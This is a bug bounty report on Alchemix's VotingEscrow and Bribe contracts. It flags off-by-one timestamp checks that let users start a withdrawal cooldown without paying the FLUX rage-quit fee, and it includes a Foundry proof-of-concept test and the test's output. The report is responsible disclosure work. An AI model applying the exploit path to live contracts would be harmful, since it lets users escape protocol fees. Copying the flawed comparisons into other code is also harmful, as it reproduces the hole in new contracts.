# 31588 - \[SC - Low] Users could start cooldown period for their wit...

Submitted on May 21st 2024 at 15:18:40 UTC by @savi0ur for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31588

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Contract fails to deliver promised returns, but doesn't lose value

## Description

## Bug Description

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L379>

```solidity
function claimableFlux(uint256 _tokenId) public view returns (uint256) {
    // If the lock is expired, no flux is claimable at the current epoch
    if (block.timestamp > locked[_tokenId].end) { //@audit
        return 0;
    }

    // Amount of flux claimable is <fluxPerVeALCX> percent of the balance
    return (_balanceOfTokenAt(_tokenId, block.timestamp) * fluxPerVeALCX) / BPS;
}
```

In `claimableFlux` function, `block.timestamp > locked[_tokenId].end` is used to check if lock is expired. According to this condition, lock is not expired till `block.timestamp == locked[_tokenId].end`.

But in other places of the code, same check is not there. As shown below. <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1156>

```solidity
function _calculatePoint(LockedBalance memory _locked, uint256 _time) internal pure returns (Point memory point) {
    if (_locked.end > _time && _locked.amount > 0) { //@audit
        point.slope = _locked.maxLockEnabled ? int256(0) : (int256(_locked.amount) * iMULTIPLIER) / iMAXTIME;
        point.bias = _locked.maxLockEnabled
            ? ((int256(_locked.amount) * iMULTIPLIER) / iMAXTIME) * (int256(_locked.end - _time))
            : (point.slope * (int256(_locked.end - _time)));
    }
}
```

While calculating `point` and `bias`, its first checking if lock has not expired `_locked.end > _time` and `_locked.amount > 0`, then calculate `Point`. According to above check from `claimableFlux` function, it should be `_locked.end >= _time`.

Similarly, <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L727>

```solidity
function updateUnlockTime(uint256 _tokenId, uint256 _lockDuration, bool _maxLockEnabled) external nonreentrant {
    // ..SNIP..

    // If max lock is not enabled, require that the lock is not expired
    if (!_locked.maxLockEnabled) require(_locked.end > block.timestamp, "Lock expired"); //@audit
    // ..SNIP..
}
```

It should be `if (!_locked.maxLockEnabled) require(_locked.end >= block.timestamp, "Lock expired");`

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L672>

```solidity
function depositFor(uint256 _tokenId, uint256 _value) external nonreentrant {
    // ..SNIP..
    require(_locked.end > block.timestamp, "Cannot add to expired lock. Withdraw");
    // ..SNIP..
}
```

It should be `require(_locked.end >= block.timestamp, "Cannot add to expired lock. Withdraw");`

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L748>

```solidity
function withdraw(uint256 _tokenId) public nonreentrant {
    // ..SNIP..
    require(block.timestamp >= _locked.cooldown, "Cooldown period in progress");
    // ..SNIP..
}
```

For cooldown period check, it should not allow to withdraw when `block.timestamp == _locked.cooldown`, as cooldown has not expired yet when its equal. It should be `require(block.timestamp > _locked.cooldown, "Cooldown period in progress");`

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L630-L631>

```solidity
function merge(uint256 _from, uint256 _to) external {
    // ..SNIP..
    require(_locked0.end > block.timestamp, "Cannot merge when lock expired");
    require(_locked1.end > block.timestamp, "Cannot merge when lock expired");
```

It should be `require(_lockedX.end >= block.timestamp, "Cannot merge when lock expired");`.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L196>

```solidity
function getPriorVotingIndex(uint256 timestamp) public view returns (uint256) {
    // ..SNIP..
    // Check most recent balance
    if (votingCheckpoints[nCheckpoints - 1].timestamp < timestamp) {
        return (nCheckpoints - 1);
    }
```

It should be `if (votingCheckpoints[nCheckpoints - 1].timestamp <= timestamp) {`. See [`getPriorBalanceIndex`](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L164) function.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L229>

```solidity
function earned(address token, uint256 tokenId) public view returns (uint256) {
    if (numCheckpoints[tokenId] == 0) {
        return 0;
    }

    uint256 _startTimestamp = lastEarn[token][tokenId];

    // Prevent earning twice within an epoch
    if (block.timestamp - _bribeStart(_startTimestamp) < DURATION) {
        return 0;
    }
```

It should be `if (block.timestamp - _bribeStart(_startTimestamp) <= DURATION) {`.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L792>

```solidity
function startCooldown(uint256 _tokenId) external {
    // ..SNIP..
    // If lock is not expired, cooldown can only be started by burning FLUX
    if (block.timestamp < _locked.end) {
        // ..SNIP..
    }

    emit CooldownStarted(msg.sender, _tokenId, _locked.cooldown);
}
```

It should be `if (block.timestamp <= _locked.end) {`.

Due to the above incorrect checks, user's could start cooldown period for their withdrawal without paying any FLUX tokens.

## Impact

User's could start cooldown period for their withdrawal without paying any FLUX tokens. User will have both FLUX tokens and their BPT tokens at the end of EPOCH. Its not align with what the project requirement is, i.e, to charge rage quit fee in terms of FLUX tokens for withdrawing before lock ends.

This free FLUX tokens later can be use to boost their votes.

## Recommendation

Implement correct checks as described above.

## References

* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

## Proof Of Concept

**Steps to Run using Foundry:**

* Paste following foundry code in `src/test/VotingEscrow.t.sol`
* Run using `FOUNDRY_PROFILE=default forge test --fork-url $FORK_URL --fork-block-number 17133822 --match-contract VotingEscrowTest --match-test testCooldownWithoutPayingFlux -vv`

```solidity
// Start cool down period without paying any flux tokens
function testCooldownWithoutPayingFlux() public {
    hevm.startPrank(admin);

    uint256 tokenId = veALCX.createLock(TOKEN_1, FIVE_WEEKS, false);

    uint256 bptBalanceBefore = IERC20(bpt).balanceOf(admin);

    uint256 fluxBalanceBefore = IERC20(flux).balanceOf(admin);
    uint256 alcxBalanceBefore = IERC20(alcx).balanceOf(admin);

    console.log("\nBefore:");
    console.log("bpt balance:", bptBalanceBefore);
    console.log("flux balance:", fluxBalanceBefore);
    console.log("alcx balance:", alcxBalanceBefore);

    hevm.expectRevert(abi.encodePacked("Cooldown period has not started"));
    veALCX.withdraw(tokenId);

    voter.reset(tokenId);

    hevm.warp(newEpoch());

    voter.distribute();

    uint256 unclaimedAlcx = distributor.claimable(tokenId);
    uint256 unclaimedFlux = flux.getUnclaimedFlux(tokenId);
    console.log("unclaimedAlcx:", unclaimedAlcx);
    console.log("unclaimedFlux", unclaimedFlux);

    hevm.warp(veALCX.lockEnd(tokenId));
    console.log("\nLock state:");
    console.log("veALCX.lockEnd(tokenId):", veALCX.lockEnd(tokenId));
    console.log("block.timestamp:", block.timestamp);
    console.log("Lock Expired (veALCX.lockEnd(tokenId) < block.timestamp) ?: ", veALCX.lockEnd(tokenId) < block.timestamp);
    
    // Start cooldown once lock is expired
    veALCX.startCooldown(tokenId);

    hevm.expectRevert(abi.encodePacked("Cooldown period in progress"));
    veALCX.withdraw(tokenId);

    hevm.warp(newEpoch());

    veALCX.withdraw(tokenId);

    uint256 bptBalanceAfter = IERC20(bpt).balanceOf(admin);
    uint256 fluxBalanceAfter = IERC20(flux).balanceOf(admin);
    uint256 alcxBalanceAfter = IERC20(alcx).balanceOf(admin);

    console.log("\nAfter:");
    console.log("bpt balance:", bptBalanceAfter);
    console.log("flux balance:", fluxBalanceAfter);
    console.log("alcx balance:", alcxBalanceAfter);

    console.log("bpt diff:", bptBalanceAfter - bptBalanceBefore);
    // Bpt balance after should increase by the withdraw amount
    assertEq(bptBalanceAfter - bptBalanceBefore, TOKEN_1);

    // ALCX and flux balance should increase
    assertEq(alcxBalanceAfter, alcxBalanceBefore + unclaimedAlcx, "didn't claim alcx");
    assertEq(fluxBalanceAfter, fluxBalanceBefore + unclaimedFlux, "didn't claim flux");

    // Check that the token is burnt
    assertEq(veALCX.balanceOfToken(tokenId), 0);
    assertEq(veALCX.ownerOf(tokenId), address(0));

    hevm.stopPrank();
}
```

**Console Output:**

```shell
> FOUNDRY_PROFILE=default forge test --fork-url $FORK_URL --fork-block-number 17133822 --match-contract VotingEscrowTest --match-test testCooldownWithoutPayingFlux -vv

Ran 1 test for src/test/VotingEscrow.t.sol:VotingEscrowTest
[PASS] testCooldownWithoutPayingFlux() (gas: 5837088)
Logs:

Before:
  bpt balance: 99999999000000000000000000
  flux balance: 0
  alcx balance: 293395801110954330220661
  unclaimedAlcx: 6139572462147626427072
  unclaimedFlux 95889301115384577

Lock state:
  veALCX.lockEnd(tokenId): 1685577600
  block.timestamp: 1685577600
  Lock Expired (veALCX.lockEnd(tokenId) < block.timestamp) ?:  false

After:
  bpt balance: 100000000000000000000000000
  flux balance: 95889301115384577
  alcx balance: 299535373573101956647733
  bpt diff: 1000000000000000000
```
